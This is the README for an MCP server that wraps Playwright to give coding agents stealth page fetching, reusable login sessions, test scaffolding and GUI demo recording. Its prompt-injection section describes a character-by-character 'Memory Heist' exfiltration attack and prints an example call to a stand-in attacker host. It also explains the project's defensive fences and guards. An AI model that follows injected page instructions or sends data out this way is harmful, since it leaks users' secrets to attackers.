# playwright-mcp

One install, every Claude Code or Codex project gets a real browser. Page fetching with citations already attached, site debugging with persistent logins, and the full Playwright toolset underneath. Wire it up once at user scope and stop thinking about it.

## What it is

An MCP server that wraps `@playwright/mcp` and adds sixteen tools of its own for page fetching, authenticated sessions, test suites, sharing the browser between agents, and recording GUI demo videos. The installer points Claude at it: page fetches go to `web_fetch` instead of the built-in WebFetch, and browser work goes to the `browser_*` tools instead of the claude-in-chrome extension. The extra features just come along for free.

### How it layers in

Claude's built-in WebFetch returns page text. That's it.

When this server takes over that job, every fetch also comes back with structured citation metadata (author, date, publisher in CSL-JSON), a page-health classification (paywall, soft-404, parked, login-wall, blocked), and CMS detection. Claude doesn't ask for any of that. It's already sitting there when Claude summarizes a page or pulls a quote.

The other thing the built-in can't do is render. Single-page apps, JavaScript-heavy dashboards, pages behind consent walls. `web_fetch` runs a real headless Chromium with a stealth context, so it sees what a person would see.

This server has nothing to do with web search. Claude runs its own native WebSearch on Anthropic's infrastructure. The steering directive the installer adds to `~/.claude/CLAUDE.md` just tells Claude to follow up search results by visiting the top URLs with `web_fetch`, so the citations and page-health data are there when it summarizes. The server handles that page-visit part. Claude does the searching.

### The tools

Thirty-nine total. Twenty-three are the wrapped `browser_*` set (navigate, snapshot, click, screenshot, and the rest). The sixteen custom ones:

- **`web_fetch`** stealth-renders a URL (HTML or PDF), returns readable text plus the citation and health data described above. When a page comes back as a CAPTCHA or bot wall, it opens the same window `session_solve_challenge` does, sends a desktop notification on Linux, and waits up to 90 seconds for you to clear it, then retries. If you're not there, the fetch comes back blocked with a note that a window is waiting for you at that host. The window stays open for up to 30 minutes, and once you solve it the next fetch goes straight through. The clearance is saved as `wall-<host>` and every later fetch to that host reuses it until it lapses, so you only see the window again when the site asks again. That happens on stdio and the local surface, never on the cloud one.
- **`session_login`**, **`session_status`**, **`session_solve_challenge`**, and **`session_attach`** handle authenticated sessions across your projects. Capture a logged-in session once to a mode-600 storageState file, then reuse it for interactive debugging and generated Playwright test suites in whatever project you're working on. `session_solve_challenge` clears CAPTCHAs and bot walls the same way. `session_attach` binds a captured session to the `browser_*` tools so interactive browsing is authenticated too. For any login, call `session_login({headed:true})` and let the human handle the whole thing in the headed window. Password, 2FA, SSO, CAPTCHA, whatever the site throws. The window opens with a second tab holding an "I'm signed in, save it" button. Log in however the site needs, including hops to other sites, email links and 2FA, then press it. Nothing tries to guess when a login is finished, because every site does it differently. There is no time limit on the stdio surface, and closing the window cancels. An `attach:true` login runs in playwright-mcp's own Chrome profile for that session name, kept under `~/.cache/playwright-mcp/login-profiles/`, so a CAPTCHA you solve there once and the device cookies a sign-in leaves behind are still there next time. Sites like eBay wall a brand-new browser and wave through one they've seen before. Pass `profile:"temp"` for a throwaway one instead. If a site turns away the fresh window but your everyday Chrome gets in fine, add `attach:true, profile:"system"`. That copies one of your real Chrome profiles (its cookies, not the caches) into the capture window, so whatever your browser has already earned with the site comes along. It works for any site, and Chrome can stay open while it runs. It copies the `Default` profile unless you name another with `profileDirectory:"Profile 1"`. The folder name is the end of "Profile Path" on `chrome://version`. Only that site's cookies are saved, and the copy is deleted afterwards. Because it hands over your real cookies, `profile:"system"` only works when the call comes from the local stdio surface; over HTTP it's refused. And it never saves on its own, even with `session_solve_challenge`: the window gets the "I'm signed in, save it" tab, and nothing is saved until you press it.
- **`session_scaffold_tests`** generates a deterministic Playwright E2E test suite into any project, wired to reuse a session captured by `session_login`. No model in the loop. Just `npx playwright test`.
- **`suite_scaffold`**, **`suite_audit`**, and **`suite_methodology`** carry a full e2e test-suite methodology. Scaffold the complete pack into any project, audit results with per-failure dossiers, or pull the playbook on demand. More in the Test-suite builder section below.
- **`browser_lease_acquire`** and **`browser_lease_release`** hold the shared browser for a multi-step turn. See the next section.
- **`movie_record`**, **`movie_script_save`**, **`movie_script_list`**, **`movie_list`**, and **`movie_clean`** record short captioned videos of a GUI, so a proposed interface change can be shown in motion instead of described. More in the GUI demo videos section below.

### One browser, many agents: the queue

There's one `browser_*` browser per server: one current tab, one bound session. In a Claude Code session the main agent and every subagent share one connection to this server, so the server can't tell them apart. So it queues them.

Every `browser_*` call waits its turn, first come first served, and only one runs at a time. A rebind waits too: `session_attach`, and the bind step at the end of `session_login` and `session_solve_challenge`. It never lands in the middle of somebody else's call. The human part of a login or challenge doesn't hold the queue. Only the quick bind at the end does.

One call at a time still lets another agent slip in *between* your calls. If you need navigate, snapshot, click with nobody in between, take a lease:

```text
browser_lease_acquire({ holder: "linkedin-scout" })   → { lease: "<token>", ... }
browser_navigate({ url: "...", lease: "<token>" })
browser_snapshot({ lease: "<token>" })
browser_click({ ref: "e12", lease: "<token>" })
browser_lease_release({ lease: "<token>" })
```

While a lease is held, only calls carrying its token run. Everyone else waits, including other acquires and other agents' rebinds. Your own `session_attach({name, lease})` runs inside your turn. Nobody waits forever:

- A lease ends on its own after 90 seconds with no call carrying it (the clock pauses while one of its calls is running) and after 10 minutes no matter what. A crashed agent can't hold the browser hostage.
- A waiter sends progress heartbeats so Claude Code doesn't time it out. After 10 minutes it gives up with an error that says who holds the browser and for how long. Nothing ran, so it's safe to retry.
- A cancelled call leaves the queue. Releasing twice is fine. A token the server never issued, or one that already ended, gets a clear error telling you to acquire again or call without one.

Leases don't nest. Release before you acquire again. A server restart forgets every lease. The three limits are environment variables, listed in `.env.example`.

**`web_fetch` is not queued.** It renders on its own stealth browser, separate from the `browser_*` one, and it never rebinds anything. Concurrent fetches don't wait on each other or on `browser_*` calls. Each plain fetch opens its own page (tab) in the one shared stealth context, so they share that profile's cookies but never a tab. Each `web_fetch({session})` launches its own browser and context seeded from the saved session and closes it afterwards. So a job that only needs `web_fetch` never needs to stay out of the browser's way.

## Requirements

- Node 22.13 or newer. On Linux and macOS the installer takes care of this for you (see below).
- Claude Code (`claude`), Codex (`codex`), or Crush (`crush`) on your PATH
- About 170 MB for a one-time Chromium download. On a bare Linux server the installer also fetches the system libraries Chromium needs. Nothing on the Linux/macOS side needs root.
- An old x86_64 Linux distribution works too, and it carries two security trade-offs you should read before you install on one. See [Older Linux hosts](#older-linux-hosts-glibc-older-than-228).

### Getting a current Node.js

On Linux and macOS you don't have to do anything. If the system Node is older than 22.13, or there isn't one, `install.sh` downloads the current LTS from nodejs.org into `~/.cache/playwright-mcp/node`, checks it against the published checksum, and builds and registers the server with it. Your system Node stays as it was. The download goes through curl, wget, or failing both, the old Node itself.

Every official Node build from 22 onward needs glibc 2.28, which some long-lived Linux installs don't have. On such a host the installer takes the same LTS version from `unofficial-builds.nodejs.org` instead, the `linux-x64-glibc-217` build, checksummed the same way. More on that case below.

If you'd rather have a current Node on your PATH for everything, use the [`n`](https://github.com/tj/n) version manager through npx. Any old Node brings npx with it. Without root, point `n` at a directory you own.

```bash
export N_PREFIX="$HOME/.n"
```

```bash
export PATH="$N_PREFIX/bin:$PATH"
```

```bash
npx -y n lts
```

Add those two `export` lines to your shell profile (`~/.bashrc`, `~/.zshrc`, or similar) so they stick.

On Windows, grab the installer from [nodejs.org](https://nodejs.org/) or run:

```powershell
winget install OpenJS.NodeJS.LTS
```

### Older Linux hosts (glibc older than 2.28)

CentOS 7 and the distributions of that era are old enough that neither a current Node nor Chromium will run on them as shipped. The installer handles that case, and it still never asks for root.

Two thresholds, both read off the host's own glibc. Below 2.28 the private Node is the `linux-x64-glibc-217` build described above. Below 2.25, which is the floor Chromium's own builds were measured at, the installer also assembles a private glibc 2.28 runtime from checksum-pinned AlmaLinux 8.9 packages on `vault.almalinux.org`, fetches a pinned static `patchelf` from `github.com`, and patches Chromium's executables to run under that private loader. Anything at 2.28 or newer takes none of those paths, and so does a host whose glibc version can't be read at all, musl for instance. Healthy hosts are untouched.

All of it lands under `~/.cache/playwright-mcp/`, in `node/`, `glibc/`, `el8/`, `patchelf/`, and `sysroot/`. Nothing is installed system-wide and nothing needs sudo.

**On a host that needed that private runtime, Chromium runs with `--no-sandbox`, and it runs against frozen libraries.** Two trade-offs, and both are the reason to read this section before installing on such a host. The browser renders pages nobody vetted, and for the `browser_*` tools the sandbox is the layer that normally keeps a compromised renderer away from the rest of the account it runs as. That layer is not attempted here. Nobody measured whether the sandbox would have worked on any particular old host either, and the rule covers every host below 2.25, so the whole class is accepted rather than each machine checked. The other half is the runtime itself. AlmaLinux 8.9 is a closed minor, pinned exactly so its checksums cannot move, which also means those libraries never receive a security update. The only thing that changes them is a code change here.

Nothing about the sandbox changed anywhere else. The browser behind the `browser_*` tools keeps it on every other host, with two exceptions. One is a root uid, where Chromium refuses the sandbox itself. The other is a host where the sandbox cannot start at all, covered in [Hosts without Chromium's sandbox](#hosts-without-chromiums-sandbox).

arm64 hosts with old glibc are not supported. There is no glibc-2.17 Node build for arm64 to fetch, so the installer stops there with a message naming that as the reason instead of failing further along. That message comes from reading `install.sh`. No arm64 host was run.

The old-glibc path needs to reach `unofficial-builds.nodejs.org`, `vault.almalinux.org`, `github.com`, and `cdn.playwright.dev`. A host firewalled off from any of them fails at that fetch with the URL in the error.

This was all measured in exactly one place, and only one. A clean-cache `./install.sh`, then `browser_navigate` plus a snapshot, then a `web_fetch`, on CentOS 7 x86_64 as a non-root uid, inside a container. No real old-glibc machine has been tested yet, and neither has that network reach from behind a firewall that blocks any of those four hosts.

### Hosts without Chromium's sandbox

Chromium's sandbox needs unprivileged user namespaces. Some hosts don't give them to an ordinary account. A sysctl or AppArmor policy can switch them off, and a chroot always loses them, because the kernel refuses to create a user namespace for any process inside one, whatever `max_user_namespaces` says. cPanel shared hosting is the common case. Its default login shell, jailshell, is a chroot, so every install there lands on this path. `unshare -U -r true` failing with "Operation not permitted" is the quick way to tell.

On such a host Chromium won't launch sandboxed. It stops with "No usable sandbox!", or, when Google Chrome is installed, with a complaint that its SUID sandbox helper "is not configured correctly". The server watches for exactly those two refusals. When one comes back, it launches `browser_*` again with `--no-sandbox` and keeps it off for as long as the server runs. The installer's browser check goes through the same retry, and when the retry was needed it says so after "Browser OK". The server prints the same thing on stderr the first time it happens. Any other launch error is reported as it is, with the sandbox still on.

That is a real trade-off, and it happens without asking. Pages the `browser_*` tools open are rendered with no sandbox between a compromised renderer and the rest of the account. `web_fetch` and `session_login` were never sandboxed on any host, so nothing changes for them. This was measured under `bwrap --disable-userns` on Arch, with both bundled Chromium and Google Chrome, and reported from a cPanel jailshell account on EL9 before the fix. The fix itself has not yet been run on that account.

## Install

One line does the whole thing. It checks Node (fetching a current one if needed), downloads the source, installs dependencies, builds, downloads Chromium and checks it launches, then registers the server at user scope. It prints a diff of what it changes to global config so you can see exactly what happened.

**Linux / macOS**

```bash
bash -c "$(curl -fsSL https://raw.githubusercontent.com/odysseyalive/playwright-mcp/main/install.sh)"
```

**Windows PowerShell**

```powershell
irm https://raw.githubusercontent.com/odysseyalive/playwright-mcp/main/install.ps1 | iex
```

On Linux and macOS the server goes in `~/.local/share/playwright-mcp`, or `$XDG_DATA_HOME/playwright-mcp` if you set that. On Windows it goes in `%LOCALAPPDATA%\playwright-mcp`. Set `PLAYWRIGHT_MCP_HOME` to an absolute path to put it somewhere else. The new copy is built and checked in a folder right next to that one, and it only replaces the old one after the browser launches. A run that fails partway leaves your existing install as it was. On Linux and macOS it needs curl or wget, plus tar.

It registers the server with every client it finds on your PATH: Claude Code (at user scope), Codex, and Crush. For Crush it updates an existing `playwright-mcp` entry in your global `crush.json` if you already have one, and otherwise adds a marked block to your global `crushrc` with a 300-second timeout (Crush's default is 10). Both files live in `$CRUSH_GLOBAL_CONFIG` if you set it, or `~/.config/crush` otherwise. A client that isn't installed yet is skipped, and the installer prints the command to run later.

For Codex, it merges the local server into `$CODEX_HOME/config.toml` (default `~/.codex/config.toml`). Existing environment variables, enabled/disabled tools, approval settings and explicit timeouts survive a reinstall. A missing tool timeout gets 1860 seconds, enough for `suite_audit`'s maximum 30-minute run plus setup/reporting. A changed config is rewritten as TOML, so comments and formatting are lost; an exact original is saved beside it as a unique `config.toml.playwright-mcp-*.bak` file. An unchanged registration writes nothing. A malformed config or an existing HTTP entry is left alone and the installer reports the problem.

The installer adds two entries to `permissions.deny` in `~/.claude/settings.json`: `WebFetch` and `mcp__claude-in-chrome`. They take the built-in fetcher and the Chrome extension out of Claude's way, so page fetches go to `web_fetch` and browser work goes to the `browser_*` tools. They don't block anything this server provides, and native WebSearch stays on. Everything else in the file is left alone, and re-running the installer changes nothing. It also adds a steering note to `~/.claude/CLAUDE.md` that tells Claude the same thing.

### Installing from a clone

Working on playwright-mcp itself? Run the installer inside your checkout. It builds and registers that checkout in place and doesn't download anything from GitHub.

```bash
./install.sh
```

```powershell
.\install.ps1
```

Already installed from a clone and switching to the one-liner? It makes its own copy and points the registration at that copy. The clone isn't touched, so keep it or delete it.

### Registering by hand

If you'd rather skip the installer, build and register the absolute path yourself.

```bash
npm install
```

```bash
npm run build
```

```bash
npx playwright install chromium
```

```bash
claude mcp add --scope user playwright-mcp -- node /ABSOLUTE/PATH/dist/index.js
```

For Codex:

```bash
node scripts/merge-codex.mjs node /ABSOLUTE/PATH/dist/index.js --print
node scripts/merge-codex.mjs node /ABSOLUTE/PATH/dist/index.js --write
```

Run these from the package directory; use an absolute Node executable path if Node is not on Codex's PATH. Restart Codex and check `/mcp`. The local stdio connection exposes the same tools and schemas to both clients: browser interaction and screenshots, fetches and citations, session capture/reuse, browser leases, test scaffolding/auditing, and GUI movies. The scaffolded test-suite skill is written to both `.claude/skills` and `.agents/skills`.

Search and publishing belong to the client. Claude Code uses native WebSearch; Codex uses its native search when enabled. This server provides page fetching, not search. Claude's Artifact publishing workflow stays available; Codex can use a connected publishing tool or deliver durable local movie files, as described below. No publishing service is required to record a movie.

Codex enforces a total tool-call timeout, so progress heartbeats do not make a call unbounded. A lower timeout you explicitly configured remains in force; increase `tool_timeout_sec` in this server's config table if long audits or recordings need it. A human login continues on the server if a client call times out: poll `session_status({name})` to recover it. A cut-short recording is inspected with `movie_list({job})`.

For Crush, add this line to `~/.config/crush/crushrc` (`%USERPROFILE%\.config\crush\crushrc` on Windows):

```bash
mcp add playwright-mcp --type stdio --command node --args /ABSOLUTE/PATH/dist/index.js --timeout 300
```

### Updating

Run the same one-liner again. It downloads the latest `main`, rebuilds, re-downloads Chromium if the version changed, and re-registers the server. Near the top it prints the version change, like `installed: 0.3.2 -> 0.4.0`, or tells you you're already on that version. Safe to re-run any time.

It won't put an older version over a newer one. To do that on purpose, set `PLAYWRIGHT_MCP_FORCE=1` for the run (the `--force` flag does the same thing when you run `install.sh` as a file).

```bash
PLAYWRIGHT_MCP_FORCE=1 bash -c "$(curl -fsSL https://raw.githubusercontent.com/odysseyalive/playwright-mcp/main/install.sh)"
```

On Windows, set the variable first, then run the one-liner. It stays set until you close that PowerShell window.

```powershell
$env:PLAYWRIGHT_MCP_FORCE = '1'
```

From a clone, pull the latest changes and run `./install.sh` again.

### Which version you have

The installer prints the version in its last lines. After that, `.install.json` in the install folder records the version, the commit it came from, where it was downloaded from, and when.

```bash
cat ~/.local/share/playwright-mcp/.install.json
```

```powershell
Get-Content $env:LOCALAPPDATA\playwright-mcp\.install.json
```

The server answers too. It reports the same version to Claude Code when it connects, and prints it with `--version`.

```bash
node ~/.local/share/playwright-mcp/dist/index.js --version
```

## Verifying

Restart Claude Code, run `/mcp` in any project, and look for the `mcp__playwright-mcp__*` tools. To check the server on its own:

```bash
npm run smoke
```

The full deterministic gate (build, tests, smoke) is one command.

```bash
npm run gate
```

## Configuration

Credentials for `session_login` live outside the repo in `~/.config/playwright-mcp/secrets.env`, mode 600 and gitignored. See `.env.example` for the format, and set `PLAYWRIGHT_MCP_SECRETS` if you want the file somewhere else.

If the project you're working in keeps its own `.env`, `session_login` reads that first. The project file wins when both define a key, and only the keys you name in `credKeys` are ever read. If the file isn't at the project root, point the `envFile` parameter at it. The headless `credKeys` path keeps a 30-second default timeout. There's nobody to wait for.

## Authenticated end-to-end tests

The session you capture with `session_login` isn't just for interactive debugging. That same mode-600 storageState file can drive deterministic `npx playwright test` suites in any project, too. An agent drives the browser tools to discover a flow, then you freeze the known-good path as a `.spec.ts` that a runner replays with no model in the loop.

Scaffold one without leaving your project. Ask Claude to call `session_scaffold_tests` (it's right there in the tool list), and it writes a `playwright.config.ts`, a freshness-guard setup project, an example spec, and a README into the target directory. No session data, just the wiring.

```text
session_scaffold_tests({ session: "<name>", outDir: "/path/to/your/project" })
```

There's a CLI front door over the same generator, too.

```bash
npm run scaffold:e2e -- --session <name> --out /path/to/your/project
```

The generated config resolves the storageState from the same path `session_login` writes to. It honors `PLAYWRIGHT_MCP_SESSIONS`, then `XDG_CONFIG_HOME` or `APPDATA`, so it works on any machine without a hard-coded home directory. The setup project never logs in. It guards that the captured session is present and fresh, and points you back to `session_login` (headed) if it isn't. For CI, where the gitignored session file won't exist, point `STORAGE_STATE` at a file the job materializes from a masked secret. The generated `README.md` has the details.

## Test-suite builder

Beyond the basic scaffold, three `suite_*` tools carry a full, project-agnostic e2e methodology — distilled from running a large production regression suite — so an AI assistant can build, maintain, and audit test suites the same disciplined way in any project. All project specifics (fixtures, selectors, credentials, what "test mode" means) stay in the target repo; the server ships only templates, playbook text, and a report parser.

- **`suite_scaffold`** — writes the full pack into a project: Playwright config with captured-session reuse, an environment guard driven by `e2e-suite.config.json` (your test-mode up/down commands, with took-effect verification), an ENFORCING page-integrity gate (rendered server errors, leaked template tokens, `undefined`/`NaN` text fail the test), report-only error capture, session-isolation rules — plus a generated `test-suite` skill that teaches the AI the run/author/audit discipline for that project. The skill is written twice, to `.claude/skills/test-suite/` for Claude Code and `.agents/skills/test-suite/` for Codex, because neither reads the other's folder. Crush reads both and lists the skill once. Keep the two copies the same when you edit one.
- **`suite_audit`** — runs a project's suite (`run: true`) or parses its last JSON report (`reportPath`), and returns per-failure dossiers plus the adjudication rubric: every failure is classified TEST-DEFECT (fix the script) or PRODUCT-BUG (report and hand off — never relax an assertion to go green). The judgment stays with the model; the tool makes the evidence cheap and structured.
- **`suite_methodology`** — the playbook on demand (`overview` / `methodology` / `authoring` / `audit`), served from the same files the scaffolder installs, so there is exactly one source of truth.

`suite_scaffold` and `suite_audit` are local-only (remote-denylisted) like the session tools; `suite_methodology` is available everywhere.

## GUI demo videos

A screenshot shows one state. When you're proposing a change to an interface, the interesting part is usually what happens when somebody uses it. The `movie_*` tools record that.

Write the mock-up as an HTML file (or pass the HTML as a string), save the walk-through as a named step list, and record it:

```text
movie_script_save({ name: "swap-companion", steps: [
  { action: "click", target: "[data-space=W1]", caption: "Select space W1" },
  { action: "click", target: "#swap", highlight: true, caption: "Nearby free seats light up" },
  { action: "click", target: "[data-seat=B1]", highlight: true, highlightStyle: "spotlight", caption: "Pick the new companion seat" }
]})
movie_record({ job: "seating-review", scriptName: "swap-companion",
  targets: [{ label: "mockup", file: "/path/to/seat-editor.html" }],
  viewports: ["desktop", "phone"], schemes: ["light", "dark"] })
```

That's four clips, one per viewport and color scheme. Each one has a visible cursor, a ripple on every click, the step captions along the bottom, highlight boxes where the step asks for them, and a corner badge with the target's label. Those overlays are drawn into the page itself, so none of them need ffmpeg. The steps are a closed set: `navigate`, `click`, `type`, `hover`, `press`, `wait`, `scroll`. There's no script evaluation and no file upload. Change the mock-up, call `movie_record` again with the same job and script, and the clips are replaced in place.

A mock-up file is served from a loopback HTTP server the tool starts for the call, confined to the mock-up's own folder. Hidden files are never served, and neither is anything a symlink points outside the folder. You don't need `file://` or a hand-run `python -m http.server`. A mock-up runs offline: it can load anything in its own folder and nothing from anywhere else. Requests off the loopback server are refused, WebSockets are closed, and service workers and WebRTC are switched off, so a mock-up can't read a file next to it and send it somewhere. Copy fonts and libraries into the folder instead of linking a CDN. A target can also be a `url`, which is how you record a live local dev page. Pass `session` with the name of a `session_login` capture for a page behind a login. The session only goes to `url` targets on the domains it was captured on. A mock-up never gets it, because cookies ignore ports and the mock-up's own script would otherwise be able to read a localhost session.

For a before/after, give two targets and `sideBySide: true`. Mark steps the old page can't do as `optional: true` and they're skipped there, with a note.

Everything for a job lands in one folder: `~/.config/playwright-mcp/movies/jobs/<job>/` (or under `PLAYWRIGHT_MCP_MOVIES`, for a host that only lets output land in one place). Saved scripts sit beside the jobs in `movies/scripts/`. Both are owner-only. `movie_list({job})` returns the absolute paths, byte sizes, durations and posters, and flags anything over 15 MB, the claude.ai artifact embed limit. `movie_clean({job})` deletes the folder. It only removes folders `movie_record` made, and it refuses a symlink.

A movie job ends after its clips have been delivered and verified. With Claude Artifact tools, record it, upload the clips to the shareable artifact, confirm the files landed, then `movie_clean` it. `movie_clean` on its own, with no delivery, is only for throwing away a bad take or a job nobody needs.

The clips are meant to be watched, so share them on a claude.ai Artifact HTML page, never in Claude Docs. Use the shareable artifact this work already has. In the same conversation, that means republishing the same local page file, which keeps its URL. From an earlier conversation, find it with the Artifact tool's `list`, `read` it, and publish with its `url`. Add the movies as sections that match that page's own layout. Create a new one only when nothing matches, and then build it in the full house style, table of contents included: the sticky contents rail, a section 00 at-a-glance table of every movie, numbered section chips, and one section per movie that opens the same way each time. If the `shared-artifact` house-style skill is available, load it. Otherwise start from the starter this server ships, [templates/movie-page/index.html](templates/movie-page/index.html). It is the same house style with movie blocks added, and its header comment says how to fill it. The `share` line gives its absolute path on the machine running the server. Either way, the page needs at least this floor: `:root` colour tokens, a `prefers-color-scheme: dark` block guarded by `:root:not([data-theme="light"])`, a separate `:root[data-theme="dark"]` block, an explicit `body` background, a two-to-four-word `<title>`, and a viewport meta if the page writes its own `<head>`. Put each clip in the publish call's `files` map with its type spelled out, `{"movies/x.mp4": {"from": "<path>", "contentType": "video/mp4"}}` and `video/webm` for a webm, plus its `.png` poster. Don't use asset uploads, because they need a runtime capability a read-only page shouldn't ask for. Show each clip with `<video controls preload="metadata" poster="…">`, webm source first and then mp4, and a visible caption saying what it shows. Skip the gif when there's an mp4. A file over 15 MB can't go in, and one publish carries at most 64 MB, so a page with several movies goes up over a few publishes to the same `url`, each adding files. Cleanup goes through the upload and is required, in this order. First, publish or update the artifact with the clips. Second, confirm they landed: the Artifact tool's `list` action with scope `files` and the artifact's `url` shows each clip's path with a `video/*` type. Third, call `movie_clean({job})` and delete any local copies or staging folder made for the page, keeping only the page's own source file if it lives in the project. Never clean before the second step succeeds, and if a publish failed, keep the files. Both `movie_record` and `movie_list({job})` repeat this as a `share` line in their results, so a session gets the reminder when it has files in hand.

What you get depends on ffmpeg:

| Output | Needs |
|---|---|
| `.webm` clip, `.png` poster | nothing beyond the installed browser |
| `.mp4` (H.264, plays everywhere) | an ffmpeg with an h264 encoder |
| `.gif` preview (`gif: true`) | an ffmpeg with the gif encoder |
| before/after side-by-side | an ffmpeg with the hstack filter |
| durations read from the file | ffprobe (otherwise the recording is timed) |

In Codex or another client without Claude Artifact tools, publish through an available publishing tool and verify playback/download at the destination. Add clips to the page this work already has when possible. Without a publishing tool, copy the clips and posters to a durable local folder outside the movie job, optionally using the shipped HTML template with relative video paths, then give the user the absolute paths. Verify those copies before calling `movie_clean`; never hand off job-folder paths and then delete their files. A failed delivery keeps the job for recovery.

ffmpeg is looked up on `PATH`, or set `PLAYWRIGHT_MCP_FFMPEG` and `PLAYWRIGHT_MCP_FFPROBE`. Playwright's own bundled ffmpeg only encodes VP8, so it can't make any of the extras. When something is skipped, the `movie_record` result says what and why.

Recording runs in its own browser, so it doesn't wait on the shared `browser_*` queue. There's no interactive mode yet, where you'd start recording, drive the page with `browser_*` and then stop. The scripted recorder is the supported path. The `movie_*` tools are local-only, denied on every HTTP surface: they read local files, write and delete under your config directory, run ffmpeg, and can load a saved login.

## Untrusted content and prompt injection

Every page this server fetches is controlled by somebody else. A page carrying instructions aimed at the model reading it is indirect prompt injection, and no known mitigation fully prevents it. What follows is what this server does about it, and what it does not fix.

One piece of the exposure story lives up in the install notes rather than here, because it depends on your host. On a Linux host old enough to need the private glibc runtime, Chromium runs with `--no-sandbox`, against a frozen set of AlmaLinux 8.9 libraries that get no security updates. See [Older Linux hosts](#older-linux-hosts-glibc-older-than-228). The same flag goes on for `browser_*` on any host where the sandbox can't start, cPanel jailshell among them. See [Hosts without Chromium's sandbox](#hosts-without-chromiums-sandbox).

The technique is called spotlighting (Hines et al., Microsoft Research, arXiv:2403.14720). This server uses its delimiting mode, which fences untrusted content inside explicit delimiters with a warning in the opening tag. The project's internal name for the control is provenance framing. The paper's other two modes were considered and rejected. Datamarking was dropped for token cost on large documents and because it mangles code blocks and the quoted citation text `web_fetch` exists to produce. Encoding was not implemented.

### What gets marked

`web_fetch` splits its output in two. The server's own fields (`fetchStatus`, `error`, `note`, `appraisalRequested`) sit outside the fence. Page-derived fields (`text`, `citation`, `cms`, `links`, `references`) go inside an `<untrusted-content>` delimiter with the warning in the opening tag. The `error` field stays outside on purpose. Its strings are actionable guidance from the server itself ("capture it with `session_login` first"), and fencing those would tell the model to ignore its own tool's instructions.

The `browser_*` tools get the one-line `UNTRUSTED_NOTICE` appended to any result that carries page content. `browser_take_screenshot` gets a shorter label placed before the image block instead. That label names no URL. The upstream result carries no page URL at that point, and a cached last-navigated value goes stale on any click, redirect, form submit, or `browser_navigate_back`. A confidently wrong provenance claim is worse than an absent one. `browser_close` and `browser_resize` return no page content and are unmarked.

### Outbound exfiltration guards

All outbound fetches pass through `guardOutbound` (`src/exfil.ts`), a single chokepoint shared by `web_fetch` and the upstream `browser_*` tool-call path. `browser_navigate` cannot route around what `web_fetch` enforces.

`scanForSecrets` refuses any URL whose path, query, or fragment contains a known secret value from `secrets.env` or captured storageState cookies. It matches raw, URL-encoded, base64, and base64url forms, and reports the key name in the refusal, never the value.

A per-domain velocity cap limits distinct URLs per registrable domain in a rolling window (default 25 per 10 minutes). Alongside it, an alphabet-signature detector fires on 6 or more URLs from one domain that vary only in a short terminal path segment, subdomain label, or query value. Both guards target the "Memory Heist" shape, where an attacker page instructs the model to spell out private data one character at a time through URL paths.

Localhost, RFC1918, `.local`, and `.internal` hosts are exempt from the velocity guards. Debugging local dev servers is the package's primary job, and a guard that throttles localhost would just be switched off.

Escape hatches are environment variables (`PLAYWRIGHT_MCP_FETCH_LIMIT`, `PLAYWRIGHT_MCP_DISABLE_EXFIL_GUARD`), never tool arguments. An injected page can talk the model into passing a flag. It cannot reach the operator's shell.

### Remote instance hardening

On the remote surface (`PLAYWRIGHT_MCP_PUBLIC_URL` set), `assertEgressAllowed` blocks targets that resolve to private or metadata addresses. Per-hop redirect re-validation catches redirect chains that land on a private address after the initial URL passed. Both apply to `web_fetch`'s page and to the `browser_*` browser, which this server launches and hands to `@playwright/mcp`. For `browser_*` the check covers every request in the browser context, every redirect hop, and WebSockets. Upstream's own `network.blockedOrigins` list is a second layer on top. The OS-level nftables egress block ([docs/REMOTE-CONNECTOR.md](docs/REMOTE-CONNECTOR.md) section 6) is the primary SSRF control. The in-process checks are the backstop.

Tools are stripped by tier. `browser_run_code_unsafe`, `browser_evaluate`, `browser_file_upload`, `session_scaffold_tests`, `suite_scaffold`, `suite_audit`, and the five `movie_*` tools are denied on every non-stdio surface. `session_login`, `session_status`, `session_solve_challenge`, and `session_attach` are denied on the cloud (OAuth) surface too. Filtering hits both `tools/list` and `tools/call`. The operator's own stdio surface (Claude Code) keeps every tool. These denylists only apply to the HTTP transport. On the HTTP surfaces where `session_login` and `session_solve_challenge` are allowed (local no-auth), they keep a bounded 300-second default because the headed window would open on the server host where nobody is sitting. The full tier distinction is in [docs/REMOTE-CONNECTOR.md](docs/REMOTE-CONNECTOR.md).

### What this does not fix

None of this is a solution. A single `web_fetch("https://evil.test/?d=<base64>")` defeats every layer here except `scanForSecrets`, and `scanForSecrets` only knows values this package can enumerate. Nothing here changes whether the model chooses to comply with injected text. These guards raise the cost of the naive drip-exfil variant. That is what they do.

## Remote connector for claude.ai

Everything above is the local setup. The server runs over stdio for Claude Code on your own machine, and that's the default. Nothing changes unless you turn this on.

Set `PLAYWRIGHT_MCP_PUBLIC_URL` and the same server also exposes a remote Streamable-HTTP transport, so claude.ai can use it as a custom connector. The draw is the same reason the rest of this exists. claude.ai's built-in fetch just reads text. This one renders JavaScript and actually interacts with the page.

The remote side is a separate, hardened deployment, not something you run on your laptop. The tools that run code or touch credentials are stripped from what claude.ai can reach. GitHub OAuth locks it to a single login. The instance itself runs with no secrets on it at all. It needs nginx, TLS, and a firewall, so the full walkthrough lives in its own runbook, [docs/REMOTE-CONNECTOR.md](docs/REMOTE-CONNECTOR.md).

## License

MIT
